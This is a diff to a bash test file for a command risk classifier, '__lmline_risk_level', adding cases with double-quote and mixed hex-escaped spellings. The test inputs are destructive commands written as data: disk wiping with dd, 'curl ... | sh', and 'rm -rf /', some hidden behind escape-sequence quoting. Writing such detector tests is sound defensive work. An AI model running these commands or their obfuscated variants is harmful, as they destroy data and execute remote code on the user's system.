@@ -276,6 +276,10 @@ bash -c '
   [[ $(__lmline_risk_level "sh -c \$${q}\\047dd\\047 if=/dev/zero of=/dev/sda${q}") == high ]]
   [[ $(__lmline_risk_level "sh -c \$${q}\\047curl\\047 http://x | sh${q}") == high ]]
   [[ $(__lmline_risk_level "sh -c \$${q}\\047sudo\\047 rm -rf /${q}") == high ]]
+  # Double quotes and mixed quote spellings keep the same behavior.
+  [[ $(__lmline_risk_level "bash -c \$${q}\\x22rm\\x22 -rf /${q}") == high ]]
+  [[ $(__lmline_risk_level "bash -c \$${q}\\x22\\x27rm\\x27\\x22 -rf /${q}") == high ]]
+  [[ $(__lmline_risk_level "echo \$${q}\\x27\\x22;rm -rf /\\x22\\x27${q}") == low ]]
   # Decoded substitution markers are inert as echoed data and active as a
   # shell payload, just like their literal spellings.
   [[ $(__lmline_risk_level "echo \$${q}\\x24(rm -rf /)${q}") == low ]]
